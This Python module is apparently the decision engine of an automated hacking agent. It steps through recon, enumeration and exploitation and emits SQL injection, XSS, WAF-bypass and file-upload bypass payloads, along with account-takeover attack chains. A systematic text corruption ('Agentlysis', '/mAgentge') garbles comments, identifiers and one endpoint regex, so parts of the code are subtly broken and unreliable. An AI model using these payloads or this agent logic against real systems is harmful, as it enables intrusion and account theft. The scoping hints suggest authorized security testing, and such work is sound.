#!/usr/bin/env python3
"""
HackerMind - The Thinking Core of HackAgent

This isn't a scanner. It's a hacker's brain.

A real hacker:
1. OBSERVES - Gathers intel, notices anomalies
2. HYPOTHESIZES - "What if this endpoint doesn't validate...?"
3. TESTS - Crafts specific probes based on hypothesis
4. ADAPTS - Changes approach based on responses
5. CHAINS - Combines small findings into bigger exploits
6. PERSISTS - Doesn't give up, tries creative bypasses

This module implements that thinking process.
"""

import json
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple
from enum import Enum
from datetime import datetime
from pathlib import Path
import hashlib


class AttackPhase(Enum):
    RECON = "recon"
    ENUMERATION = "enumeration"
    VULNERABILITY_AgentLYSIS = "vulnerability_Agentlysis"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    REPORTING = "reporting"


class ThreatModel(Enum):
    """What am I trying to achieve?"""
    DATA_EXFILTRATION = "data_exfiltration"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    CODE_EXECUTION = "code_execution"
    DENIAL_OF_SERVICE = "denial_of_service"  # Never actually do this
    INFORMATION_DISCLOSURE = "information_disclosure"


@dataclass
class Observation:
    """Something I noticed during recon."""
    timestamp: datetime
    category: str
    detail: str
    source: str
    confidence: float  # 0-1
    leads_to: List[str] = field(default_factory=list)  # Potential attack vectors


@dataclass
class Hypothesis:
    """A theory about a potential vulnerability."""
    id: str
    description: str
    vulnerability_class: str  # OWASP category
    confidence: float
    test_plan: List[str]
    prerequisites: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)
    status: str = "untested"  # untested, testing, confirmed, rejected


@dataclass
class AttackChain:
    """Multiple findings chained together."""
    name: str
    steps: List[Dict]
    total_impact: str
    complexity: str
    prerequisites: List[str]


class HackerMind:
    """
    The cognitive engine of HackAgent.
    
    Thinks like a hacker:
    - Pattern recognition across responses
    - Hypothesis generation and testing
    - Attack chain construction
    - Adaptive strategy based on defenses encountered
    """
    
    def __init__(self, target: str, scope: Dict):
        self.target = target
        self.scope = scope  # What's in/out of scope
        self.phase = AttackPhase.RECON
        
        # Knowledge bases
        self.observations: List[Observation] = []
        self.hypotheses: List[Hypothesis] = []
        self.attack_chains: List[AttackChain] = []
        self.findings: List[Dict] = []
        
        # Learned patterns
        self.technology_stack: Dict = {}
        self.endpoints_discovered: Set[str] = set()
        self.parameters_found: Dict[str, List[str]] = {}
        self.error_patterns: List[str] = []
        self.waf_detected: Optional[str] = None
        self.rate_limiting: Optional[Dict] = None
        
        # Attack state
        self.blocked_attempts: List[Dict] = []
        self.successful_probes: List[Dict] = []
        self.current_hypothesis: Optional[Hypothesis] = None
        
        # Thinking log
        self.thought_process: List[Dict] = []
    
    def think(self, context: str) -> str:
        """
        Core reasoning function. Given context, decide next action.
        This is where the hacker mindset lives.
        """
        thought = {
            "timestamp": datetime.now().isoformat(),
            "phase": self.phase.value,
            "context": context[:200],
            "reasoning": "",
            "decision": "",
            "next_action": ""
        }
        
        # Phase-specific thinking
        if self.phase == AttackPhase.RECON:
            thought["reasoning"], thought["decision"] = self._think_recon(context)
        elif self.phase == AttackPhase.ENUMERATION:
            thought["reasoning"], thought["decision"] = self._think_enumeration(context)
        elif self.phase == AttackPhase.VULNERABILITY_AgentLYSIS:
            thought["reasoning"], thought["decision"] = self._think_vuln_Agentlysis(context)
        elif self.phase == AttackPhase.EXPLOITATION:
            thought["reasoning"], thought["decision"] = self._think_exploitation(context)
        
        self.thought_process.append(thought)
        return thought["decision"]
    
    def _think_recon(self, context: str) -> Tuple[str, str]:
        """Reconnaissance thinking."""
        reasoning = []
        
        # What do I know so far?
        reasoning.append(f"Target: {self.target}")
        reasoning.append(f"Known endpoints: {len(self.endpoints_discovered)}")
        reasoning.append(f"Tech stack identified: {bool(self.technology_stack)}")
        
        # What should I look for?
        if not self.technology_stack:
            decision = "IDENTIFY_TECH_STACK"
            reasoning.append("First priority: fingerprint the technology stack")
        elif len(self.endpoints_discovered) < 10:
            decision = "DISCOVER_ENDPOINTS"
            reasoning.append("Need more attack surface - enumerate endpoints")
        else:
            decision = "ADVANCE_TO_ENUMERATION"
            reasoning.append("Sufficient recon data, moving to enumeration")
            self.phase = AttackPhase.ENUMERATION
        
        return "\n".join(reasoning), decision
    
    def _think_enumeration(self, context: str) -> Tuple[str, str]:
        """Enumeration thinking - dig deeper into what we found."""
        reasoning = []
        
        # Agentlyze what we have
        interesting_endpoints = self._identify_interesting_endpoints()
        reasoning.append(f"Interesting endpoints: {len(interesting_endpoints)}")
        
        # Generate hypotheses based on observations
        new_hypotheses = self._generate_hypotheses()
        reasoning.append(f"New hypotheses generated: {len(new_hypotheses)}")
        
        if new_hypotheses:
            decision = "TEST_HYPOTHESES"
            self.hypotheses.extend(new_hypotheses)
        elif self.hypotheses:
            decision = "ADVANCE_TO_VULN_AgentLYSIS"
            self.phase = AttackPhase.VULNERABILITY_AgentLYSIS
        else:
            decision = "DEEPER_ENUMERATION"
        
        return "\n".join(reasoning), decision
    
    def _think_vuln_Agentlysis(self, context: str) -> Tuple[str, str]:
        """Vulnerability Agentlysis thinking."""
        reasoning = []
        
        # Prioritize hypotheses
        untested = [h for h in self.hypotheses if h.status == "untested"]
        confirmed = [h for h in self.hypotheses if h.status == "confirmed"]
        
        reasoning.append(f"Untested hypotheses: {len(untested)}")
        reasoning.append(f"Confirmed vulnerabilities: {len(confirmed)}")
        
        if untested:
            # Pick highest confidence hypothesis
            best = max(untested, key=lambda h: h.confidence)
            self.current_hypothesis = best
            decision = f"TEST_HYPOTHESIS:{best.id}"
            reasoning.append(f"Testing: {best.description}")
        elif confirmed:
            decision = "ADVANCE_TO_EXPLOITATION"
            self.phase = AttackPhase.EXPLOITATION
        else:
            decision = "BACKTRACK_TO_RECON"
            self.phase = AttackPhase.RECON
        
        return "\n".join(reasoning), decision
    
    def _think_exploitation(self, context: str) -> Tuple[str, str]:
        """Exploitation thinking - can we chain findings?"""
        reasoning = []
        
        confirmed = [h for h in self.hypotheses if h.status == "confirmed"]
        reasoning.append(f"Confirmed vulns to exploit: {len(confirmed)}")
        
        # Can we chain?
        chains = self._find_attack_chains(confirmed)
        if chains:
            reasoning.append(f"Potential attack chains: {len(chains)}")
            self.attack_chains.extend(chains)
            decision = "BUILD_CHAIN"
        elif confirmed:
            decision = "EXPLOIT_SINGLE"
        else:
            decision = "BACKTRACK"
            self.phase = AttackPhase.ENUMERATION
        
        return "\n".join(reasoning), decision
    
    def _identify_interesting_endpoints(self) -> List[str]:
        """Identify endpoints worth investigating."""
        interesting = []
        
        patterns = {
            "auth": [r"/login", r"/auth", r"/signin", r"/oauth", r"/token"],
            "api": [r"/api/", r"/v1/", r"/v2/", r"/graphql"],
            "admin": [r"/admin", r"/dashboard", r"/panel", r"/mAgentge"],
            "file": [r"/upload", r"/download", r"/file", r"/export", r"/import"],
            "user": [r"/user", r"/profile", r"/account", r"/settings"],
            "debug": [r"/debug", r"/test", r"/dev", r"/staging"],
        }
        
        for endpoint in self.endpoints_discovered:
            for category, pattern_list in patterns.items():
                for pattern in pattern_list:
                    if re.search(pattern, endpoint, re.IGNORECASE):
                        interesting.append((endpoint, category))
                        break
        
        return interesting
    
    def _generate_hypotheses(self) -> List[Hypothesis]:
        """Generate attack hypotheses based on observations."""
        hypotheses = []
        
        # Based on tech stack
        if "php" in str(self.technology_stack).lower():
            hypotheses.append(Hypothesis(
                id=self._gen_id(),
                description="PHP application may be vulnerable to type juggling",
                vulnerability_class="A03:Injection",
                confidence=0.3,
                test_plan=[
                    "Send 0 instead of string in comparison",
                    "Try 0e123 as password (magic hash)",
                    "Check for loose comparison bugs"
                ]
            ))
        
        if "wordpress" in str(self.technology_stack).lower():
            hypotheses.append(Hypothesis(
                id=self._gen_id(),
                description="WordPress may have vulnerable plugins",
                vulnerability_class="A06:Vulnerable Components",
                confidence=0.6,
                test_plan=[
                    "Enumerate plugins via /wp-content/plugins/",
                    "Check plugin versions against CVE database",
                    "Test xmlrpc.php for brute force"
                ]
            ))
        
        # Based on endpoints
        for endpoint in self.endpoints_discovered:
            if "/api/" in endpoint and "id" in endpoint.lower():
                hypotheses.append(Hypothesis(
                    id=self._gen_id(),
                    description=f"IDOR possible at {endpoint}",
                    vulnerability_class="A01:Broken Access Control",
                    confidence=0.5,
                    test_plan=[
                        "Change ID parameter to another user's ID",
                        "Try sequential IDs",
                        "Try negative IDs",
                        "Try string IDs"
                    ]
                ))
            
            if "search" in endpoint.lower() or "query" in endpoint.lower():
                hypotheses.append(Hypothesis(
                    id=self._gen_id(),
                    description=f"SQL injection possible at {endpoint}",
                    vulnerability_class="A03:Injection",
                    confidence=0.4,
                    test_plan=[
                        "Try ' in search parameter",
                        "Try ' OR '1'='1",
                        "Try SLEEP(5) to detect blind SQLi",
                        "Try UNION SELECT"
                    ]
                ))
            
            if "upload" in endpoint.lower():
                hypotheses.append(Hypothesis(
                    id=self._gen_id(),
                    description=f"File upload vulnerability at {endpoint}",
                    vulnerability_class="A03:Injection",
                    confidence=0.6,
                    test_plan=[
                        "Upload .php with image extension",
                        "Try double extension .php.jpg",
                        "Try null byte .php%00.jpg",
                        "Check Content-Type bypass"
                    ]
                ))
        
        # Based on error patterns
        for error in self.error_patterns:
            if "sql" in error.lower() or "mysql" in error.lower():
                hypotheses.append(Hypothesis(
                    id=self._gen_id(),
                    description="SQL error exposed - SQLi likely",
                    vulnerability_class="A03:Injection",
                    confidence=0.8,
                    test_plan=["Exploit SQL error for injection"],
                    evidence=[error]
                ))
        
        return hypotheses
    
    def _find_attack_chains(self, findings: List[Hypothesis]) -> List[AttackChain]:
        """Find ways to chain multiple vulnerabilities."""
        chains = []
        
        # Example chains
        # IDOR + Information Disclosure -> Account Takeover
        idor_findings = [f for f in findings if "IDOR" in f.description]
        info_findings = [f for f in findings if "Information" in f.vulnerability_class]
        
        if idor_findings and info_findings:
            chains.append(AttackChain(
                name="IDOR to Account Takeover",
                steps=[
                    {"action": "Use IDOR to access other user data", "finding": idor_findings[0].id},
                    {"action": "Extract password reset token", "finding": info_findings[0].id},
                    {"action": "Take over account", "result": "Full account access"}
                ],
                total_impact="Critical - Account Takeover",
                complexity="Medium",
                prerequisites=["Valid session"]
            ))
        
        # XSS + CSRF -> Privileged Action
        xss_findings = [f for f in findings if "XSS" in f.description]
        if xss_findings:
            chains.append(AttackChain(
                name="XSS to Admin Action",
                steps=[
                    {"action": "Inject XSS payload", "finding": xss_findings[0].id},
                    {"action": "Steal admin session or perform actions", "result": "Privilege escalation"}
                ],
                total_impact="High - Privilege Escalation",
                complexity="Medium",
                prerequisites=["Admin visits malicious page"]
            ))
        
        return chains
    
    def observe(self, category: str, detail: str, source: str, confidence: float = 0.5):
        """Record an observation."""
        obs = Observation(
            timestamp=datetime.now(),
            category=category,
            detail=detail,
            source=source,
            confidence=confidence
        )
        self.observations.append(obs)
        
        # Auto-process certain observations
        if category == "error":
            self.error_patterns.append(detail)
        elif category == "endpoint":
            self.endpoints_discovered.add(detail)
        elif category == "technology":
            self.technology_stack[source] = detail
    
    def process_response(self, url: str, status: int, headers: Dict, body: str):
        """Agentlyze an HTTP response like a hacker would."""
        
        # Tech fingerprinting
        server = headers.get("Server", "")
        if server:
            self.observe("technology", server, "Server header")
        
        powered_by = headers.get("X-Powered-By", "")
        if powered_by:
            self.observe("technology", powered_by, "X-Powered-By header")
        
        # Error Agentlysis
        if status >= 400:
            self.observe("error", f"{status} at {url}", url)
            
            # Look for stack traces
            if "exception" in body.lower() or "traceback" in body.lower():
                self.observe("error", "Stack trace exposed", url, confidence=0.9)
            
            # SQL errors
            sql_errors = ["mysql", "sqlite", "postgresql", "ora-", "sql syntax"]
            for err in sql_errors:
                if err in body.lower():
                    self.observe("error", f"SQL error: {err}", url, confidence=0.9)
        
        # WAF detection
        waf_indicators = {
            "cloudflare": ["cf-ray", "__cfduid"],
            "akamai": ["akamai"],
            "aws_waf": ["awswaf"],
            "mod_security": ["mod_security", "NOYB"],
        }
        
        for waf, indicators in waf_indicators.items():
            for indicator in indicators:
                if indicator.lower() in str(headers).lower() or indicator.lower() in body.lower():
                    self.waf_detected = waf
                    self.observe("defense", f"WAF detected: {waf}", url, confidence=0.8)
        
        # Rate limiting detection
        if status == 429 or "rate limit" in body.lower():
            self.rate_limiting = {"detected": True, "url": url}
            self.observe("defense", "Rate limiting active", url, confidence=0.9)
        
        # Interesting content
        patterns = {
            "config_key_in_response": r"['\"]api[_-]?key['\"]:\s*['\"][^'\"]+['\"]",
            "jwt_in_response": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            "internal_ip": r"(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+",
            "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "debug_mode": r"debug['\"]?\s*[:=]\s*['\"]?true",
        }
        
        for name, pattern in patterns.items():
            if re.search(pattern, body, re.IGNORECASE):
                self.observe("interesting", f"{name} found", url, confidence=0.7)
    
    def adapt_to_waf(self) -> List[str]:
        """Generate WAF bypass techniques."""
        bypasses = []
        
        if self.waf_detected == "cloudflare":
            bypasses = [
                "Try origin IP directly",
                "Use HTTP/2",
                "Fragment payloads",
                "Use Unicode normalization",
            ]
        elif self.waf_detected == "mod_security":
            bypasses = [
                "Use /**/ instead of spaces",
                "Try /*!50000 SELECT*/",
                "URL encode payloads",
                "Use HPP (HTTP Parameter Pollution)",
            ]
        else:
            bypasses = [
                "Case variation (SeLeCt)",
                "Double URL encoding",
                "Null bytes",
                "Newline injection",
            ]
        
        return bypasses
    
    def generate_payload(self, vuln_type: str, context: Dict) -> List[str]:
        """Generate smart payloads based on context."""
        payloads = []
        
        if vuln_type == "sqli":
            # Adapt based on what we learned
            if "mysql" in str(self.error_patterns).lower():
                payloads = [
                    "' OR 1=1-- -",
                    "' UNION SELECT NULL,@@version,NULL-- -",
                    "' AND SLEEP(5)-- -",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -"
                ]
            elif "postgresql" in str(self.error_patterns).lower():
                payloads = [
                    "'; SELECT pg_sleep(5)--",
                    "' UNION SELECT NULL,version(),NULL--",
                ]
            else:
                # Generic
                payloads = [
                    "'",
                    "' OR '1'='1",
                    "1' ORDER BY 1--+",
                    "1' ORDER BY 10--+",
                ]
            
            # WAF bypass versions
            if self.waf_detected:
                payloads.extend([
                    "'/**/OR/**/1=1--",
                    "' /*!50000OR*/ 1=1--",
                    "'+OR+1=1--",
                ])
        
        elif vuln_type == "xss":
            payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
            ]
            
            if self.waf_detected:
                payloads.extend([
                    "<img src=x onerror=alert`1`>",
                    "<svg/onload=alert`1`>",
                    "<body/onload=alert(1)>",
                    "'-alert(1)-'",
                ])
        
        elif vuln_type == "idor":
            base_id = context.get("base_id", "1")
            payloads = [
                str(int(base_id) + 1),
                str(int(base_id) - 1),
                "0",
                "-1",
                base_id + "1",
                "admin",
                "../" + base_id,
            ]
        
        return payloads
    
    def _gen_id(self) -> str:
        """Generate unique ID."""
        return hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8]
    
    def get_status(self) -> Dict:
        """Get current hacking status."""
        return {
            "phase": self.phase.value,
            "target": self.target,
            "observations": len(self.observations),
            "hypotheses": len(self.hypotheses),
            "confirmed_vulns": len([h for h in self.hypotheses if h.status == "confirmed"]),
            "attack_chains": len(self.attack_chains),
            "waf_detected": self.waf_detected,
            "tech_stack": self.technology_stack,
            "thought_count": len(self.thought_process)
        }
    
    def explain_thinking(self) -> str:
        """Explain current thought process."""
        if not self.thought_process:
            return "No thinking recorded yet."
        
        last = self.thought_process[-1]
        return f"""
**Current Phase:** {last['phase']}
**Context:** {last['context']}
**Reasoning:** {last['reasoning']}
**Decision:** {last['decision']}
        """


if __name__ == "__main__":
    # Demo
    mind = HackerMind(
        target="https://example.com",
        scope={"in_scope": ["*.example.com"], "out_of_scope": ["admin.example.com"]}
    )
    
    # Simulate observations
    mind.observe("endpoint", "/api/users/{id}", "directory_scan")
    mind.observe("endpoint", "/api/search?query=", "directory_scan")
    mind.observe("endpoint", "/upload", "directory_scan")
    mind.observe("technology", "PHP/7.4", "X-Powered-By header")
    mind.observe("error", "MySQL error: syntax error near '", "/api/search")
    
    # Think!
    print("=" * 60)
    print("HACKER MIND DEMO")
    print("=" * 60)
    
    for _ in range(3):
        decision = mind.think("Agentlyzing target...")
        print(f"\nDecision: {decision}")
        print(f"Status: {mind.get_status()}")
    
    print("\n" + "=" * 60)
    print("HYPOTHESES GENERATED:")
    print("=" * 60)
    for h in mind.hypotheses:
        print(f"\n[{h.confidence:.0%}] {h.description}")
        print(f"    Class: {h.vulnerability_class}")
        print(f"    Test: {h.test_plan[0]}")


